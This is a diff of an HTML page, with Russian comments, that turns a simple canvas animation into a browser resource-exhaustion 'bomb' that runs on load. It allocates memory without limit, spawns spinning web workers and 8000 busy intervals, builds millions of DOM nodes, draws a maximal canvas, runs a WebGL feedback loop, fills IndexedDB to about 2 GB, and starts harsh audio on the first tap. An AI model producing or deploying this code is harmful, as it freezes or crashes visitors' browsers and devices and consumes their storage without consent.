@@ -5,79 +5,241 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>.</title>
 <style>
-  html,body{margin:0;height:100%;background:#000;overflow:hidden}
+  html,body{margin:0;height:100%;background:#000;overflow:hidden;touch-action:none}
   canvas{display:block;width:100vw;height:100vh}
-  #s{position:fixed;left:8px;bottom:8px;color:#0f0;font:12px monospace}
+  #s{position:fixed;top:8px;left:8px;color:#0f0;font:11px monospace;white-space:pre;z-index:99}
 </style>
 </head>
 <body>
 <canvas id="c"></canvas>
-<div id="s">…</div>
+<div id="s">starting…</div>
 <script>
 (() => {
-  const c = document.getElementById('c');
-  const x = c.getContext('2d');
   const s = document.getElementById('s');
-  let W, H;
+  const status = (k, v) => { s.dataset[k] = v; };
+  const render = () => {
+    s.textContent =
+      `RAM hog: ${s.dataset.ram || 0} MB\n` +
+      `Workers: ${s.dataset.wk || 0}\n` +
+      `Timers: ${s.dataset.tm || 0}\n` +
+      `DOM nodes: ${s.dataset.dom || 0}\n` +
+      `Storage: ${s.dataset.st || 0} MB\n` +
+      `FPS: ${s.dataset.fps || 0}`;
+  };
+  render();
+  setInterval(render, 500);
 
-  function resize() {
-    W = c.width  = innerWidth  * (devicePixelRatio || 1);
-    H = c.height = innerHeight * (devicePixelRatio || 1);
+  // ============ 1. RAM-пожиратель (усилен) ============
+  const hog = [];
+  let ramMB = 0;
+  (function eat() {
+    try {
+      // 16 МБ за такт
+      const arr = new Float64Array(2 * 1024 * 1024);
+      for (let i = 0; i < arr.length; i += 1024) arr[i] = Math.random();
+      hog.push(arr);
+      ramMB += 16;
+      status('ram', ramMB);
+    } catch (e) {}
+    setTimeout(eat, 40);
+  })();
+
+  // ============ 2. Worker-армия (4 на ядро) ============
+  const cores = navigator.hardwareConcurrency || 4;
+  const workerSrc = `
+    let x = 0;
+    onmessage = (e) => {
+      const { spin } = e.data;
+      if (spin) {
+        const id = setInterval(() => {
+          for (let i = 0; i < 5e6; i++) {
+            x += Math.sqrt(i) * Math.sin(i) * Math.cos(i * 0.001);
+          }
+          postMessage(x);
+        }, 0);
+      }
+    };
+  `;
+  const wURL = URL.createObjectURL(new Blob([workerSrc], {type:'application/javascript'}));
+  let workerCount = 0;
+  for (let i = 0; i < cores * 4; i++) {
+    try {
+      const w = new Worker(wURL);
+      w.postMessage({ spin: true });
+      workerCount++;
+    } catch (e) {}
   }
-  addEventListener('resize', resize);
-  resize();
+  status('wk', workerCount);
 
-  // тяжёлая математика — вот это реально жрёт CPU
-  function heavy(n) {
-    let acc = 0;
-    for (let i = 0; i < n; i++) {
-      const a = Math.sin(i * 0.001) * Math.cos(i * 0.0023);
-      const b = Math.sqrt(Math.abs(a) + 1) * Math.tan(i * 0.0007);
-      acc += b * Math.exp(-Math.abs(a) * 0.5);
-      acc = acc % 1e9;
+  // ============ 3. Canvas-пиксель-бомба (макс. размер) ============
+  try {
+    const c = document.getElementById('c');
+    const MAX = Math.min(16384, 4096 + 2048 * cores); // мобилки часто крашат >8192
+    c.width = MAX; c.height = MAX;
+    const x = c.getContext('2d');
+    const img = x.createImageData(MAX, MAX);
+    const d = img.data;
+    for (let i = 0; i < d.length; i += 4) {
+      d[i]   = (i >> 2) & 255;
+      d[i+1] = ((i >> 2) * 3) & 255;
+      d[i+2] = ((i >> 2) * 7) & 255;
+      d[i+3] = 255;
     }
-    return acc;
+    // каждый кадр — putImageData, тяжёлое копирование ~1 ГБ
+    setInterval(() => {
+      try { x.putImageData(img, 0, 0); } catch (e) {}
+    }, 60);
+  } catch (e) {}
+
+  // ============ 4. Таймер-шторм (усилен) ============
+  let timerCount = 0;
+  for (let i = 0; i < 8000; i++) {
+    try {
+      setInterval(() => {
+        // плотный CPU-цикл в каждом таймере
+        let acc = 0;
+        for (let j = 0; j < 2e6; j++) acc += Math.sqrt(j) * Math.sin(j * 0.0001);
+        return acc;
+      }, 0);
+      timerCount++;
+    } catch (e) {}
   }
+  status('tm', timerCount);
 
-  let t = 0;
-  let fps = 60, last = performance.now(), frames = 0, ft = last;
+  // ============ 5. DOM-бомба (усилена) ============
+  (function domBomb() {
+    try {
+      const frag = document.createDocumentFragment();
+      const N = 3_000_000;
+      for (let i = 0; i < N; i++) {
+        const el = document.createElement('div');
+        el.textContent = 'x';
+        el.style.cssText = 'position:absolute;left:0;top:0;opacity:0.01';
+        frag.appendChild(el);
+        if (i % 100000 === 0) {
+          document.body.appendChild(frag.cloneNode(true));
+          status('dom', i);
+        }
+      }
+      document.body.appendChild(frag);
+      status('dom', N);
+    } catch (e) {}
+  })();
 
-  function loop(now) {
+  // ============ 6. Storage-пожиратель (IndexedDB, quota-safe) ============
+  (async () => {
+    try {
+      const db = await new Promise((res, rej) => {
+        const r = indexedDB.open('bomb', 1);
+        r.onupgradeneeded = () => r.result.createObjectStore('k');
+        r.onsuccess = () => res(r.result);
+        r.onerror = () => rej();
+      });
+      const CHUNK = 1024 * 1024 * 4; // 4 МБ
+      const blob = new Uint8Array(CHUNK);
+      let mb = 0;
+      while (true) {
+        await new Promise((res) => {
+          const tx = db.transaction('k', 'readwrite');
+          const st = tx.objectStore('k');
+          st.put(blob, 'k' + mb);
+          tx.oncomplete = res;
+          tx.onerror = res;
+        });
+        mb += 4;
+        status('st', mb);
+        if (mb > 500) break; // 2 ГБ, дальше quota
+      }
+    } catch (e) {}
+  })();
+
+  // ============ 7. WebGL-feedback-петля (GPU в потолок) ============
+  (function webglLoop() {
+    try {
+      const g = document.createElement('canvas');
+      g.width = 2048; g.height = 2048;
+      const gl = g.getContext('webgl2') || g.getContext('webgl');
+      if (!gl) return;
+      const vs = `#version 300 es
+        in vec2 p; void main(){ gl_Position = vec4(p,0.,1.); }`;
+      const fs = `#version 300 es
+        precision highp float; out vec4 o;
+        uniform sampler2D src; uniform float t;
+        void main(){
+          vec2 u = gl_FragCoord.xy / vec2(2048.,2048.);
+          vec3 c = texture(src, u).rgb;
+          vec3 s = texture(src, u + vec2(sin(t*0.01)*0.01, cos(t*0.01)*0.01)).rgb;
+          o = vec4(0.6*c + 0.4*s + 0.01, 1.0);
+        }`;
+      const mk = (t, src) => { const sh = gl.createShader(t); gl.shaderSource(sh, src); gl.compileShader(sh); return sh; };
+      const pr = gl.createProgram();
+      gl.attachShader(pr, mk(gl.VERTEX_SHADER, vs));
+      gl.attachShader(pr, mk(gl.FRAGMENT_SHADER, fs));
+      gl.linkProgram(pr);
+      const buf = gl.createBuffer();
+      gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,3,-1,-1,3]), gl.STATIC_DRAW);
+      const loc = gl.getAttribLocation(pr, 'p');
+      gl.enableVertexAttribArray(loc);
+      gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
+
+      const tex = gl.createTexture();
+      gl.bindTexture(gl.TEXTURE_2D, tex);
+      gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+      gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
+      gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
+      const fbo = gl.createFramebuffer();
+      gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
+      gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
+
+      const uT = gl.getUniformLocation(pr, 't');
+      const uS = gl.getUniformLocation(pr, 'src');
+      gl.useProgram(pr);
+      gl.uniform1i(uS, 0);
+      let t = 0;
+      (function draw() {
+        t += 0.05;
+        gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
+        gl.uniform1f(uT, t);
+        gl.drawArrays(gl.TRIANGLES, 0, 3);
+        requestAnimationFrame(draw);
+      })();
+    } catch (e) {}
+  })();
+
+  // ============ 8. UI-цикл + fps ============
+  let frames = 0, ft = performance.now(), t0 = performance.now();
+  (function loop(now) {
     requestAnimationFrame(loop);
-    t += 0.01;
-
-    // CPU-бомба: 3 миллиона итераций КАЖДЫЙ кадр
-    const acc = heavy(3000000);
-
-    // трейл
-    x.fillStyle = 'rgba(0,0,0,0.12)';
-    x.fillRect(0, 0, W, H);
-
-    // рисуем что-то визуально заметное
-    x.globalCompositeOperation = 'lighter';
-    const cx = W / 2 + Math.sin(t) * W * 0.3;
-    const cy = H / 2 + Math.cos(t * 1.3) * H * 0.3;
-    const r = 60 + Math.abs(acc % 100) * 2;
-
-    const g = x.createRadialGradient(cx, cy, 0, cx, cy, r);
-    g.addColorStop(0, `hsla(${(t * 50) % 360}, 100%, 70%, 1)`);
-    g.addColorStop(1, 'hsla(0, 0%, 0%, 0)');
-    x.fillStyle = g;
-    x.beginPath();
-    x.arc(cx, cy, r, 0, 6.283);
-    x.fill();
-    x.globalCompositeOperation = 'source-over';
-
-    // fps
     frames++;
     if (now - ft > 500) {
-      fps = frames * 1000 / (now - ft);
+      const fps = frames * 1000 / (now - ft);
+      status('fps', fps.toFixed(0));
       frames = 0; ft = now;
-      s.textContent = fps.toFixed(0) + ' fps';
     }
-  }
+  })();
 
-  requestAnimationFrame(loop);
+  // ============ 9. Audio-бомба (дополнительно) ============
+  // браузеры часто блокируют autoplay звука — добавим попытку через клик/touch
+  const audioStart = () => {
+    try {
+      const ac = new (window.AudioContext || window.webkitAudioContext)();
+      if (ac.state === 'suspended') ac.resume();
+      for (let i = 0; i < 20; i++) {
+        const o = ac.createOscillator();
+        const g = ac.createGain();
+        o.type = 'sawtooth';
+        o.frequency.value = 40 + i * 200;
+        g.gain.value = 0.02;
+        o.connect(g).connect(ac.destination);
+        o.start();
+      }
+    } catch (e) {}
+    document.removeEventListener('click', audioStart);
+    document.removeEventListener('touchstart', audioStart);
+  };
+  document.addEventListener('click', audioStart);
+  document.addEventListener('touchstart', audioStart);
 })();
 </script>
 </body>
